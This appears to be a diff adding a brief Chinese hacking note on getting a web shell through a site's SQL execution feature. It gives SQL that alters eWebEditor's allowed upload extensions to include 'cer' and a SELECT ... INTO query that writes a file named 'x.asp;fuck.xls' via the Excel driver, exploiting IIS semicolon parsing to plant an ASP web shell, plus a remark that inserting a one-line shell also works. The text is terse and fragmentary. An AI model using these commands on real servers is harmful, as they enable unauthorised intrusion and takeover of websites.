@@ -1,0 +1,8 @@
+
+网站后台能执行SQL时的另一种拿shell方法
+
+update eWebEditor_Style in 'E:\webhost\ygpftlhq\www\admin\Editor\db\ewebeditor.mdb' set   s_imageext='gif|jpg|jpeg|bmp|cer'
+提示“不能更新，数据库或对象为只读
+SELECT '' into [fuck] in 'E:\webhost\ygpftlhq\www\x.asp;fuck.xls' 'EXCEL 4.0;' from web_admin
+
+己新建表,插入一句话也行 .执行
